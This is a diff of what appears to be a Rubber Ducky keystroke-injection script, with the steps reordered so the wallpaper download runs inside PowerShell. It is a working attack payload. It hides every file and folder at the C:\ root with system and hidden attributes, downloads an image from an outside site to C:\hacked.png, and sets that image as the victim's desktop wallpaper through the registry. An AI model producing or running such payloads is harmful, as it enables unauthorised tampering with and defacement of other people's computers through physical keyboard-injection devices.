@@ -30,20 +30,20 @@ REM --Navigate To C:\ & Set Hidden Attribute To Each File And Folder--
 
 STRING cd /
 ENTER
-STRING attrib +s +h *
+STRING attrib +s +h *; exit
 ENTER
 
 REM --Download Image And Set It As Background--
 
-STRING Invoke-WebRequest -Uri https://wallpaperaccess.com/full/896790.png -OutFile C:\hacked.png
-ENTER
-STRING Set-ItemProperty -Path "HKCU:Control Panel\Desktop" -Name WallPaper -Value C:\hacked.png; exit
-ENTER
 GUI r
 DELAY 200
 STRING powershell
 ENTER
 DELAY 200
+STRING Invoke-WebRequest -Uri https://wallpaperaccess.com/full/896790.png -OutFile C:\hacked.png
+ENTER
+STRING Set-ItemProperty -Path "HKCU:Control Panel\Desktop" -Name WallPaper -Value C:\hacked.png
+ENTER
 STRING rundll32.exe user32.dll, UpdatePerUserSystemParameters 0, True; exit
 ENTER
 GUI D
